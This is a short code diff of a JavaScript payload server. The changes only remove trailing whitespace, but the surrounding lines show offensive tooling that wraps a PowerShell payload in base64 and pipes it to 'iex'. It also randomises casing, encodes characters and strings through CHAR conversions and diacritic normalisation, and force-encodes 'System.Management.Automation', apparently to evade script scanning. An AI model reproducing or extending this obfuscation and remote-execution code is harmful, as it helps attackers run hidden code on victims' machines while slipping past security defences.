@@ -68,7 +68,7 @@ async function respond() {
  * @returns {Promise<Response>}
  */
 async function respondEnc() {
-    payload = `${randomCase("[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String(")}"${toBinary(getPayload())}"))|iex`   
+    payload = `${randomCase("[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String(")}"${toBinary(getPayload())}"))|iex`
   return new Response(payload, {
     status: 200,
     headers: {
@@ -158,7 +158,7 @@ function obfuscateInt(int){
 /*
 * From: https://stackoverflow.com/questions/7033639/split-large-string-in-n-size-chunks-in-javascript
 * Splits a string into N sized chunks
-* @param {String} str, {Int} size 
+* @param {String} str, {Int} size
 * @returns {Array} Chunks of string you split into N (size)
 */
 function chunkSubstr(str, size) {
@@ -184,7 +184,7 @@ function obfuscateChar(char){
     switch (randomInt(2)) {
         case 0:
             return startChar + "[" + randomCase("CHAR") + "]" + byteEncode(char)
-    
+
         case 1:
             return startChar + "[" + randomCase("CHAR") + "]" + charEncode(char)
     }
@@ -256,7 +256,7 @@ function obfuscateString(input){
         case 1:
             // FormD obfuscate, we use substring(1) to remove the first +
             let obfuscatedFormD = [..."FormD"].map(c => obfuscateChar(c)).join('').substring(1)
-            // pattern obfuscate, we use substring(1) to remove the first +    
+            // pattern obfuscate, we use substring(1) to remove the first +
             let obfuscatedPattern = [...String.raw`\p{Mn}`].map(c => obfuscateChar(c)).join('').substring(1)
 
             return `+('${diacriticEncode(input)}').${randomCase("Normalize")}(${obfuscatedFormD}) -replace ${obfuscatedPattern}`
@@ -289,7 +289,7 @@ function encodePayload(input){
 	    "System",
         "Management",
         "Automation"
-        
+
     ]
 
     for (const word of mustEncode){
